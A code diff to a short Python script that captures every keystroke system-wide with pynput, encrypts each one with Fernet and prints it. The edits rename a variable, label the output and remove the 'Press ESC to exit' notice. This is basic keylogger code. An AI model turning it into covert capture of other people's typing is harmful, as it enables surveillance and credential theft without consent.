@@ -2,9 +2,9 @@ from pynput import keyboard
 from cryptography.fernet import Fernet
 
 # Generate a random encryption key
-key = Fernet.generate_key()
+enc_key = Fernet.generate_key()
 # Create an instance of the Fernet cipher using the encryption key
-cipher = Fernet(key)
+cipher = Fernet(enc_key)
 
 
 def encrypt_keystrokes(key):
@@ -16,7 +16,7 @@ def encrypt_keystrokes(key):
         # Encrypt the keystroke using the Fernet cipher
         encrypted_keystroke = cipher.encrypt(plaintext)
         # Print the encrypted keystroke
-        print(encrypted_keystroke.decode(), end='\n', flush=True)
+        print("Keystroke = " + encrypted_keystroke.decode(), end='\n', flush=True)
 
 
 def on_press(key):
@@ -32,5 +32,5 @@ def on_release(key):
 
 # Start the listener
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    print("Encrypting keystrokes. Press ESC to exit.")
+    print("Encrypting keystrokes.")
     listener.join()
